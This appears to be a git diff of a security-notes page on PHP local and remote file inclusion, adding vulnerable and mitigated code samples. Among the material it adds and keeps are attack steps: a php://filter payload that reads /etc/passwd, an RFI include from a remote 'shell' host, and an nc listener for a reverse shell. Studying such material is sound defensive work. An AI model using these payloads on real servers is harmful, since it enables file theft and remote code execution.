@@ -1,32 +1,133 @@
 # local file inclusion & remote file inclusion
 
-<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-How does it Happend ?
+## How does it Happend ?
+
+### Vuln Code (LFi)
+
+```php
+<?php
+// Vulnerable code
+if (isset($_GET['page'])) {
+    $page = $_GET['page'];
+    include($page . '.php');
+}
+?>
+```
+
+{% hint style="danger" %}
+In this example, the <mark style="color:red;">**`include`**</mark> function includes a file based on the user-supplied input without any validation. An attacker can manipulate the <mark style="color:red;">**`page`**</mark> parameter to include arbitrary files from the server
+{% endhint %}
+
+### Mitigation Code (LFI)
+
+* Input Validation
+* File Access Controls
+* Use Whitelists
+
+```php
+<?php
+// Mitigated code Use Whitelists
+$whitelist = ['home', 'about', 'contact'];
+
+if (isset($_GET['page'])) {
+    $page = $_GET['page'];
+
+    // Check if the requested page is in the whitelist
+    if (in_array($page, $whitelist)) {
+        include($page . '.php');
+    } else {
+        echo "Invalid page request.";
+    }
+} else {
+    include('home.php'); // default page
+}
+?>
+```
+
+{% hint style="success" %}
+n the mitigated version, a whitelist of allowed pages is used. The <mark style="color:blue;">**`in_array`**</mark> function checks if the user-supplied <mark style="color:blue;">**`page`**</mark> is in the whitelist before including the file. This prevents the inclusion of unauthorized files.
+{% endhint %}
 
 
+
+### Vulnerable Code (RFI)
+
+```php
+<?php
+// Vulnerable code
+if (isset($_GET['file'])) {
+    $file = $_GET['file'];
+    include($file);
+}
+?>
+```
+
+{% hint style="danger" %}
+In this example, an attacker can manipulate the <mark style="color:red;">**`file`**</mark> parameter to include a file from a remote server
+{% endhint %}
+
+### Mitigated Code (RFI)
+
+```php
+<?php
+// Mitigated code
+if (isset($_GET['file'])) {
+    $file = $_GET['file'];
+
+    // Only allow including files from a specific directory
+    $allowed_directory = 'includes/';
+
+    // Build the full path
+    $filepath = realpath($allowed_directory . $file . '.php');
+
+    // Check if the file exists and is within the allowed directory
+    if ($filepath && strpos($filepath, realpath($allowed_directory)) === 0) {
+        include($filepath);
+    } else {
+        echo "Invalid file request.";
+    }
+} else {
+    include('includes/home.php'); // default file
+}
+?>
+```
+
+{% hint style="success" %}
+In the mitigated version, the code ensures that only files within the <mark style="color:blue;">**`includes/`**</mark> directory can be included. The <mark style="color:blue;">**`realpath`**</mark> function is used to get the absolute path, and `strpos` ensures that the path starts with the allowed directory, preventing directory traversal attacks.
+{% endhint %}
 
 * Directory Traversal / Path Traversal
   * list or  read file/Dir only
 
 in bWAPP
 
-<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 can't execute file&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Local File inclusion (LFI)
   * can read and execute file local
 
-<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
+
+### How to bypass lfi add extention .jpg/png/php/etc....
+
+<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+### make server `http://192.168.1.10/shell?`
+
+<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
 ### php wrapper local file inclusion
 
-```
-php://filter/convert.base64-encode/resource=/etc/passwd
-```
+<pre><code><strong>php://filter/convert.base64-encode/resource=/etc/passwd
+</strong></code></pre>
 
 * [file://](https://www.php.net/manual/en/wrappers.file.php) — Accessing local filesystem
 * [http://](https://www.php.net/manual/en/wrappers.http.php) — Accessing HTTP(s) URLs
@@ -51,7 +152,7 @@ make Simple server
 php -S <IP>:<PORT>
 ```
 
-<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 make simple code php to test  shell.txt
 
@@ -91,11 +192,11 @@ attacker Machine first listening......
 nc -nvlp <port>
 ```
 
-<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### How to find Them <a href="#blind-interesting-lfi2rce-files" id="blind-interesting-lfi2rce-files"></a>
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
 ### Blind - Interesting - LFI2RCE file <a href="#blind-interesting-lfi2rce-files" id="blind-interesting-lfi2rce-files"></a>
 
